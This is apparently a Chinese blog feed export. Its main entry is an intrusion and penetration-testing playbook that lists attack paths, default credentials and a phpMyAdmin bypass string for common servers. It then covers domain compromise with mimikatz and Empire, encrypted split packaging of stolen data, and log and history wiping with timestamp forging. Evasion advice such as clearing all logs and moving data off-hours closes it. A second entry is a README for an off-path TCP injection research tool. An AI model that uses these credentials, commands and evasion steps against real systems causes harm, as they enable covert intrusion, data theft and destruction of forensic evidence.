CVE，后面就是验证漏洞是否存在。如果是使用漏洞扫描工具可以直接获取对应端口上的漏洞，后面也是验证漏洞。安全检查一般是尽可能的发现所有漏洞，对漏洞的风险进行评估和修复。入侵的话只关注高危远程代码执行和敏感信息泄露漏洞等可以直接利用的漏洞。 2.1 Web2.1.1 自定义 Web 应用从公网直接攻击目标对外的 Web 应用，或者在授权的情况下在内网进行渗透测试，如果是入侵目的可以直接寻找注入、上传、代码执行、文件包含等高危漏洞，尝试获取系统权限，或者直接能拿到敏感数据。允许扫描的话一般使用 WVS 直接扫描，也可以使用专门扫描特定漏洞的扫描工具如 sqlmap、XSStrike 等工具扫描特定类型的漏洞。不允许直接扫描，使用 Burp 手工慢慢找了。 2.1.2 Web 中间件 Tomcat Tomcat是Apache Jakarta软件组织的一个子项目，Tomcat是一个JSP/Servlet容器，它是在SUN公司的JSWDK（Java Server Web Development Kit）基础上发展起来的一个JSP和Servlet规范的标准实现，使用Tomcat可以体验JSP和Servlet的最新规范。 端口号：8080 攻击方法： 默认口令、弱口令，爆破，tomcat5 默认有两个角色：tomcat和role1。其中账号both、tomcat、role1的默认密码都是tomcat。弱口令一般存在5以下的版本中。 在管理后台部署 war 后门文件 远程代码执行漏洞 参考： https://paper.seebug.org/399/ http://www.freebuf.com/column/159200.html http://liehu.tass.com.cn/archives/836 http://www.mottoin.com/87173.html Jboss 是一个运行EJB的J2EE应用服务器。它是开放源代码的项目，遵循最新的J2EE规范。从JBoss项目开始至今，它已经从一个EJB容器发展成为一个基于的 J2EE 的一个Web 操作系统（operating system for web），它体现了 J2EE 规范中最新的技术。 端口：8080 攻击方法： 弱口令，爆破 管理后台部署 war 后门 反序列化 远程代码执行 参考： http://www.vuln.cn/6300 http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html https://www.zybuluo.com/websec007/note/838374 https://blog.csdn.net/u011215939/article/details/79141624 WebLogic WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。 端口：7001，7002 攻击方法： 弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic 管理后台部署 war 后门 SSRF 反序列化漏洞 weblogic_uac 参考： https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/ https://bbs.pediy.com/thread-224954.htm WebSphere IBM公司一套典型的电子商务应用开发工具及运行环境。 端口：默认端口：908*；第一个应用就是9080，第二个就是9081；控制台9090 攻击方法： 控制台登录爆破 很多内网 websphere 的控制台存在弱口令 / 默认口令，可以使用 admin/admin 以及 webshpere/webshpere 这种口令登录。 通过该口令登录控制台后，可以部署 war 包，从而获取到 WEBSHELL 。 反序列化 任意文件泄露 参考： https://loudong.sjtu.edu.cn/?keyword=WebSphere&amp;serverity=%E9%AB%98%E5%8D%B1 http://www.fr1sh.com/wooyun_1/bug_detail.php?wybug_id=wooyun-2013-036803 https://gist.github.com/metall0id/bb3e9bab2b7caee90cb7 2.1.3 Web 框架 Struts2 Struts2是一个优雅的,可扩展的框架,用于创建企业准备的Java Web应用程序。出现的漏洞也着实的多每爆一个各大漏洞平台上就会被刷屏。 可利用漏洞 S2-046 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10 S2-045 CVE-2017-5638 Struts 2.3.5-2.3.31,Struts 2.5-2.5.10 S2-037 CVE-2016-4438 Struts 2.3.20-2.3.28.1 S2-032 CVE-2016-3081 Struts 2.3.18-2.3.28 S2-020 CVE-2014-0094 Struts 2.0.0-2.3.16 S2-019 CVE-2013-4316 Struts 2.0.0-2.3.15.1 S2-016 CVE-2013-2251 Struts 2.0.0-2.3.15 S2-013 CVE-2013-1966 Struts 2.0.0-2.3.14 S2-009 CVE-2011-3923 Struts 2.0.0-2.3.1.1 S2-005 CVE-2010-1870 Struts 2.0.0-2.1.8.1 参考： https://github.com/hktalent/myhktools https://github.com/Lucifer1993/struts-scan https://github.com/SecureSkyTechnology/study-struts2-s2-054_055-jackson-cve-2017-7525_cve-2017-15095 Spring 框架 Spring Framework 是一个开源的Java／Java EE全功能栈（full-stack）的应用程序框架，以Apache License 2.0开源许可协议的形式发布，也有.NET平台上的移植版本。Spring Framework提供了一个简易的开发方式，这种开发方式，将避免那些可能致使底层代码变得繁杂混乱的大量的属性文件和帮助类。 可利用漏洞 CVE-2010-1622 CVE-2018-1274 CVE-2018-1270 CVE-2018-1273 反序列化 目录穿越 参考 http://www.inbreak.net/archives/377 https://www.secpulse.com/archives/71762.html http://www.open-open.com/news/view/1225d07 https://xz.aliyun.com/t/2261 https://xz.aliyun.com/t/22522.1.4 Web 服务器 IIS：Windows 的 WWW 服务器 https://masterxsec.github.io/2017/06/07/IIS-write-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ http://www.freebuf.com/articles/4908.html https://www.anquanke.com/post/id/85811 IIS，开启了 WebDAV，可以直接详服务器 PUT 文件 短文件名枚举漏洞 远程代码执行 提权漏洞 解析漏洞 端口：80 Apache 解析漏洞 目录遍历 端口：80​​ Nginx​ https://www.seebug.org/vuldb/ssvid-92538 解析漏洞 目录遍历 CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。 端口：80 lighttpd 目录遍历 端口：80 2.2 常见运维系统一般分自动化部署和运维监控相关的的工具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官网上的安全通告获取。内网的通用类应用比较常见的问题是弱口令，如果一个管理员可以登录几个系统，那在这几个系统的账号、密码也基本上是一样的。 2.2.1 GitlabGitLab是一个利用 Ruby on Rails 开发的开源应用程序，实现一个自托管的项目仓库，可通过Web界面进行访问公开的或者私人项目。 可利用漏洞： 任意文件读取漏洞 意用户 token 泄露漏洞 命令执行漏洞 参考： http://blog.knownsec.com/2016/11/gitlab-file-read-vulnerability-cve-2016-9086-and-access-all-user-authentication-token/ http://rinige.com/index.php/archives/577/2.2.2 JenkinsJenkins是一种跨平台的持续集成和交付的应用软件，它便于不断稳定地交付新的软件版本，并提高你的工作效率。这款开发运维工具还让开发人员更容易把项目的变化整合起来，并使用大量的测试和部署技术。 可利用漏洞： 远程代码执行漏洞 反序列化漏洞 未授权访问漏洞 登录入口爆破 参考 https://www.cnblogs.com/backlion/p/6813260.html https://www.anquanke.com/post/id/86018 https://paper.seebug.org/199/2.2.3 PuppetPuppet Enterprise专门管理基础设施即代码(IAC)，在这种类型的IT基础设施配置过程中，系统用代码而不是脚本流程来自动构建、管理和配置。由于它是代码，整个过程易于重复。Puppet有助于更容易控制版本、自动化测试和持续交付，可以更快速地响应问题或错误。 可利用漏洞，很少公开的POC 反序列化 远程命令执行2.2.4 AnsibleAnsible是一种配置和管理工具，面向客户端的软件部署和配置，支持Unix、Linux和Windows。它使 用JSON和YAML，而不是IAC，根本不需要节点代理就可以安装。它可以通过OpenStack在内部系统上使用，也可以在亚马逊EC2上使用。 可利用漏洞 远程代码执行2.2.5 NagiosNagios是一款开源的电脑系统和网络监视工具，能有效监控Windows、Linux和Unix的主机状态，交换机路由器等网络设置，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。 可利用漏洞 代码执行 SQLi 参考 http://www.bugku.com/thread-87-1-1.html http://www.mottoin.com/93936.html2.2.6 ZabbixZabbix 是一款强大的开源分布式监控系统, 能够将SNMP、JMX、Zabbix Agent提供的数据通过WEB GUI的方式进行展示. 可利用漏洞（具体参考 ExploitDB）： 远程代码执行 SQLi shell 命令注入 认证绕过 默认账户与密码，默认口令 admin/zabbix，或者是guest/空 参考 https://blog.csdn.net/ytuo1223/article/details/45937981 http://vinc.top/2017/04/18/zabbix%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/ http://www.mottoin.com/87570.html2.2.7 CacitCacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。 可利用漏洞 任意代码执行 SQLi 登录爆破 默认密码admin/admin 参考： http://wooyun.jozxing.cc/static/bugs/wooyun-2011-02674.html2.2.8 SplunkSplunk Enterprise 可以从任何来源监控和分析机器数据，以提供操作智能，从而优化您的 IT、安全和业务绩效。Splunk Enterprise 具有直观的分析功能、机器学习、打包应用程序和开放式 API，是一个灵活的平台，可从重点用例扩展到企业范围的分析主干。 可利用漏洞 信息泄露 命令注入 服务端请求伪造 参考 ExploitDB 搜索 2.3 常见 Web 应用还有常见邮件应用、CMS 应用，在搜索引擎上查找对应的漏洞，利用已知漏洞进行攻击。 2.3.1 邮件系统一部分是使用腾讯企业邮箱、阿里企业邮箱的，很难有可利用的漏洞，另外一种是能独立部署的邮件系统，政企常用的邮箱应用： Coremail 亿邮 35互联 TurboMail Exchange IBM Lotus2.4 数据库/缓存/消息服务2.4.1 MySQL数据库默认端口：3306 攻击方法： 爆破：弱口令 身份认证漏洞：CVE-2012-2122 拒绝服务攻击 Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意 提权 参考： https://www.seebug.org/appdir/MySQL http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390 https://xz.aliyun.com/t/14912.4.2 MSSQL数据库默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控） 攻击方法： 爆破：弱口令/使用系统用户 注入 参考： https://www.anquanke.com/post/id/860112.4.3 Oracle数据库默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务） 攻击方法： 爆破：弱口令 注入攻击； 漏洞攻击； -参考： https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html2.4.4 PostgreSQL数据库PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。 默认端口：5432 攻击方法： 爆破：弱口令：postgres postgres 缓冲区溢出：CVE-2014-2669 参考： http://drops.xmd5.com/static/drops/tips-6449.html https://www.secpulse.com/archives/69153.html2.4.5 MongoDB数据库MongoDB，NoSQL数据库；攻击方法与其他数据库类似》 默认端口：27017 攻击方法： 爆破：弱口令 未授权访问；github有攻击代码；请点击 参考： http://www.cnblogs.com/LittleHann/p/6252421.html http://www.tiejiang.org/19157.html2.4.6 Redis数据库Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。 攻击方法： 爆破：弱口令 未授权访问+配合ssh key提权； 参考： http://www.alloyteam.com/2017/07/12910/2.4.7 SysBase数据库默认端口：服务端口5000；监听端口4100；备份端口：4200 攻击方法： 爆破：弱口令 命令注入： 参考2.4.8 DB2 数据库默认端口：5000 攻击方法： 安全限制绕过：成功后可执行未授权操作（CVE-2015-1922） 参考： http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071 2.5 常见服务/协议2.5.1 FTP 服务FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议） 攻击方式： 爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块； 匿名访问：用户名：anonymous 密码：为空或任意邮箱 嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关） 后门 vsftp 远程溢出 跳转攻击2.5.2 NFS 服务NFS（Network File System）即网络文件系统，是FreeBSD支持的文件系统中的一种，它允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。 攻击方法 未授权访问 参考 http://www.freebuf.com/articles/network/159468.html http://www.vuln.cn/63682.5.3 Samba服务Samba是linux和unix系统上实现SMB/CIFS协议的一个免费软件，由服务器和客户端程序构成。而SMB是局域网支持共享文件和打印机的一种通信协议，为局域网内不同计算机之间提供文件及打印机等资源的共享服务。 攻击方法 远程代码执行 弱口令 未授权访问（public） 参考 http://www.91ri.org/17114.html2.5.4 SSH 服务SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 端口：22 攻击方法： 爆破 后门 漏洞：28退格漏洞、OpenSSL漏洞 参考 https://cloud.tencent.com/developer/article/10781872.5.5 Telnet 服务Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在終端使用者的电脑上使用telnet程序，用它连接到服务器。終端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。 默认端口：21 攻击方法： 爆破 嗅探2.5.6 Windows 远程连接默认端口：3389 攻击方法 爆破 Shift粘滞键后门：5次shift后门 利用ms12-020攻击3389端口2.5.7 VNC服务VNC（Virtual Network Computing），为一种使用RFB协议的显示屏画面分享及远程操作软件。此软件借由网络，可发送键盘与鼠标的动作及即时的显示屏画面。 默认端口：5900+桌面ID（5901；5902） 攻击方式： 爆破：弱口令 认证口令绕过： 拒绝服务攻击：（CVE-2015-5239） 权限提升：（CVE-2013-6886）2.5.8 SMTP协议smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！ 默认端口：25（smtp）、465（smtps） 攻击方式： 爆破：弱口令 未授权访问2.5.9 POP3协议默认端口：109（POP2）、110（POP3）、995（POP3S） 攻击方式： 爆破；弱口令 未授权访问；2.5.10 DNS服务默认端口：53 攻击方式： 区域传输漏洞2.5.11 IMAP协议默认端口：143（imap）、993（imaps） 攻击方式： 爆破：弱口令 配置不当2.5.12 SNMP协议默认端口：161 攻击方式: 爆破：弱口令2.5.13 DHCP服务默认端口：67&amp;68、546（DHCP Failover做双机热备的） 攻击方式： DHCP劫持；2.6 云环境2.6.1 VMware使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。 端口（很多）： https://kb.vmware.com/s/article/2115330 https://kb.vmware.com/s/article/2081930 漏洞 主机逃逸 CVE-2017-5638 参考： https://paper.seebug.org/348/ http://www.freebuf.com/articles/system/141179.html http://www.mottoin.com/100651.html http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html https://twitter.com/VMwareSRC https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1 https://www.vmware.com/cn/security/hardening-guides.html2.6.2 OpenStackOpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。 漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。 权限绕过漏洞 信息泄露 代码执行漏洞 参考： https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1 https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html http://www.freebuf.com/news/topnews/107203.html2.6.3 DockerDocker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制[1]。Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。 安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）： CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞 CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞 CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞 CVE-2014-9358 1.3.3 Docker 目录遍历漏洞 CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞 CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞 CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞 内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。 拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。 容器突破（Container breakouts） Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。 有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。 参考： https://toutiao.io/posts/2y9xx8/preview http://www.yunweipai.com/archives/21610.html http://www.91ri.org/15837.html https://blog.csdn.net/ruidu_doer/article/details/53401523 https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1 http://dockone.io/article/150 http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8 https://blog.waterstrong.me/docker-security/ 2.7 大数据2.7.1 ElsaticsearchElasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。 默认端口：9200（）、9300（） 攻击方法： 未授权访问； 远程命令执行； 文件遍历； 低版本webshell植入； 参考 http://www.freebuf.com/sectool/38025.html https://www.secpulse.com/archives/5401.html2.7.2 hadoopHadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。 参考： https://tech.meituan.com/hadoop-security-practice.html https://zhuanlan.zhihu.com/p/33525241 https://www.anquanke.com/post/id/85343 https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html2.7.3 HiveHive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。 参考： https://cwiki.apache.org/confluence/display/Hive/Security https://www.cnblogs.com/yejibigdata/p/6394719.html2.7.4 SqoopApache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。 参考 https://sqoop.apache.org/docs/1.99.7/security.html2.7.5 HBaseHBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。 参考： https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html http://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html2.7.6 SparkSpark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。 参考： http://cwiki.apachecn.org/pages/viewpage.action?pageId=28879053 后渗透3.1 提权SecWiki 总结了： https://github.com/SecWiki/windows-kernel-exploits https://github.com/SecWiki/linux-kernel-exploits3.2 域攻击通常域内渗透的过程 确定目标系统和应用程序 识别潜在的漏洞 利用漏洞获得初始访问 提升权限 定位域管理进程或者获取远程系统上的本地身份验证令牌 通过本地管理员的密码Hash，破解密码，使用mimikatz工具抓取密码验证运行在远程系统上的域名管理进程 迁移域管理进程 创建一个域管理员假设到这里已经从外网或内网利用漏洞入侵到到一台服务器，并且通过提权获取了主机管理员权限，接下来要做的工作是获取域管理员权限，并找到敏感数据。 通常会使用到的工具： Empire PowerUp PowerView一般熟练使用一种就够用了，以 Empire 为例：Empire 和 Metasploit 的使用原理是一样的，都是先设置一个监听，然后去生成一个木马，然后在目标主机运行该木马，我们的监听就会连接上反弹回来的代理。 参考： https://www.anquanke.com/post/id/87328 http://www.4hou.com/technology/4704.html域渗透另外一个工具 mimikatz，用于抓 Windows 密码，使用参考： http://www.mottoin.com/98506.html https://zhuanlan.zhihu.com/p/349912693.3 建立后门/端口转发参考： http://www.zerokeeper.com/experience/network-port-forwarding-and-penetration.html https://1sparrow.com/2018/01/20/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E6%80%BB%E7%BB%93/ http://drops.xmd5.com/static/drops/tools-15000.html端口转发及代理类工具LCX：windows下面的端口转发软件。 sockscap：主要针对windows平台的端口转发和代理转发。 proxifier：跨平台的端口转发和代理工具，适用windows，linux， Macos平台，代理转发利器 Rsscoks：＊nix平台下的端口转发和代理工具，配合proxychains好用 到不行。 Proxychains：＊nix平台下老牌的socks代理工具，一般的系统都会自 带，谁用谁知道。 ssh proxy：通过ssh做端口代理和转发，一般＊nix系统都自带。 netcat：socat，hping，在很多情况下可以做端口转发和数据代理转 发。 metasploit：metasploit的后渗透模块中有不少代理模块和端口转发 模块。在中转服务器上下载端口转发工具（加密压缩）：能连接互联网下载 通过 mstsc 的磁盘加载 通过入口服务器中转 通过远程控制软件上传3.4 传输文件3.4.1 文件打包关于打包 Rar文件打包，压缩d:\data\目录下所有2013-01-01后修改的doc文件，100M/包密码为Pass，-x为排除选项 rar.exe a–r –v100m new.rar –ta20130101000000 –hpPass –n*.doc –x*.exe d:\data\ 7z加密，压缩d:\data下所有文件，密码为Pass，分卷100M/包 7z.exe a c:\xx.7z -pPass -mhe d:\data -v100m Linux用 tar 打包文件是可以加密码，要跟openssl结合使用。 tar -zcvf - pma|openssl des3 -salt -k password | dd of=pma.des3使用 tar 对加密文件解压： dd if=pma.des3 |openssl des3 -d -k password|tar zxf - 3.4.2 文件传输几个思路 使用端口转发直接传送数据； 搭建 FTP、HTTP 协议； 上传到云端再下载；3.5 制作后门/木马程序一般用Matisploit 的 msfvenom，使用参考： https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom https://www.offensive-security.com/metasploit-unleashed/msfvenom/SET 也可以生成后门程序，另外也可以关注一下最新的 Office、PDF 的漏洞 4 日志清理这部分对于安全检查、或授权渗透测试工作不是重点，通常也不考虑。 在做日志清理前需要了解以下的内容： 攻击和入侵很难完全删除痕迹，没有日志记录本身就是一种入侵特征； 删除或清理入侵系统的本地日志不代表删除了痕迹，在网络设备、安全设备、集中化日志系统上仍然留存记录； 留存的后门本身会有攻击者的信息； 使用的代理或跳板可能会被反向入侵; 在操作前检查是否有管理员登录； 删除上传的工具，使用磁盘覆写的功能删除；Windows日志类型web日志：IIS、Apache以及其它web日志 操作日志：3389登录列表、最近访问文件、IE等浏览 器访问日志、文件访问日志 登陆日志：系统应用日志-安全日志等 攻击前和状态还原，尽量保持一致Linux操作日志Linux历史操作 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; SSHD登陆记录 删除~/.ssh/known_hosts中记录 修改文件时间戳 touch –r 原文件要修改文件 删除临时使用文件，尤其是tmp目录 logtamper5 工具和其他内网使用工具渗透的一些原则 使用适合自己的工具，工具没必要收集太多，够用就行； 能根据实际情况编写适用的工具； 不能确保安全的工具均要在虚拟机中运行（很 多捆绑病毒木马）； 做安全检查的话，尽量使用 GitHub 上开源的工具。 工具介绍 个人习惯使用 kali 自带工具，特定 POC 先从 Github 上搜索。 推荐一个工具介绍的网站：https://www.kitploit.com/ 渗透注意事项 检查内网监控防范系统 谨慎使用ARP软件和大面积扫描软件 使用目标网络中无空闲机器，作为打包对象 使用内网大流量机器作为传输对象，如wsus服务 器、视频会议系统 使用临时机器打包、数据传输，不要使用已控机器，可利用wmi脚本或wmic远程操作 渗透注意事项 禁止使用psexec.exe 打包时避开用户工作时间 控制卷包大小&lt;100M 选择用户常用压缩软件 错峰下载数据 控制传输流量 清除所有操作日志 登录主机前先看看管理员是否在]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Off-Path TCP Exploit]]></title>
    <url>%2F2019%2F08%2F24%2FOff-Path-TCP-Exploit%2F</url>
    <content type="text"><![CDATA[​ We discover a subtle yet serious timing side channel that exists in all generations of IEEE 802.11 or Wi-Fi technology, due to the fact that they are half-duplex. By exploiting the vulnerability, we are able to constrcut reliable and practical off-path TCP injection attacks against the laterst versions of all three major operating systems (macOS, Windows, and Linux). Our attac only requires a devicce connected to the Internet via a wireless router, and be reachable from an attack server. The thread model is that a user is lured to visit a malicious website first and then the puppet (i.e., a malicious javascript) running in a browser collaborates with an off-path adversary to hijack a TCP connection between the client and server for the prupose of injecting a spurious HTTP response that will be cached in the browser. Later on, when the victim accesses to the server, the browser would load the cached object (e.g., a script) rather than request it again. Notice that the victim connection is established and preserved by the puppet who repeatedly includes HTML elements (e.g, images). See web-cache poisoning atttacks for more background. 我们发现了一个微妙但严重的定时侧通道，存在于所有代的IEEE 802.11或Wi-Fi技术中，因为它们是半双工的。通过利用该漏洞，我们能够针对所有三个主要操作系统（MacOS、Windows和Linux）的最新版本构建可靠且实用的非路径TCP注入攻击。我们的ATTAC只需要一个通过无线路由器连接到互联网的设备，并且可以从攻击服务器访问。线程模型是先引诱用户访问恶意网站，然后在浏览器中运行的Puppet（即恶意javascript）与非路径对手协作，劫持客户端和服务器之间的TCP连接，以防止注入虚假的HTTP响应。将在浏览器中缓存。稍后，当受害者访问服务器时，浏览器将加载缓存对象（例如脚本），而不是再次请求它。注意，受害者连接是由木偶建立和保留的，木偶反复包含HTML元素（例如，图像）。更多背景信息，请参见[网络缓存中毒属性] (https://people.eecs.berkeley.edu/~yahel/papers/Browser-Cache-Poisoning.Song.Spring10.attack-project.pdf) Supported Platforms（支持的平台）Each branch is maintained for ONE OS. Currently, you’re on the branch for Windows. 每个分支都为一个OS维护。 目前，您在Windows的分支机构。 **Windows (Current Branch)(https://github.com/seclab-ucr/tcp_exploit)MacOS (https://github.com/seclab-ucr/tcp_exploit/tree/release_mac/) How to build（如何构建）123451.1 sudo apt-get install libnetfilter-queue-dev1.2 cd tcp_exploit/server/src1.3 sh build.sh Notice（注意）You have to adjust some IP addresses in the source code as follows: Change the IP address of the attacker’s machine at line 242 in the file tcp_exploit/client/index.html. 您必须按如下方式调整源代码中的某些IP地址：在文件tcp_exploit / client / index.html中的第242行更改攻击者计算机的IP地址。 The attack needs to know the exact size of the response to the request “http://www.cnn.com/SPECIALS/map.economy/images/jamie.smith.irpt.tn.jpg&quot;. However, the size varies on different machines due to HTTP headers embedded in the response. In the paper, we proposed a solution to automatically determine the size, yet I just manually set the correct value (retrieved from the developer tools in Chrome) to it by adding an option -DSEQ_DELTA=1638 in the file tcp_exploit/server/Makefile. You can also use Wireshark to obtain such information. 攻击需要知道对请求“http://www.cnn.com/SPECIALS/map.economy/images/jamie.smith.irpt.tn.jpg”的响应的确切大小。 但是，由于响应中嵌入了HTTP标头，因此在不同计算机上的大小会有所不同。 在本文中，我们提出了一个自动确定大小的解决方案，但我只是通过在tcp_exploit/server/Makefile.文件中添加选项-DSEQ_DELTA = 1638手动设置正确的值（从Chrome中的开发人员工具中检索到）。 您还可以使用Wireshark获取此类信息。 During the attack’s process, the TCP receive window size would grow as we keep requesting images. Based on the maximum window size that the client can achieve, you need to adjust the following at line 316 in the file tcp_exploit/server/src/main.c: 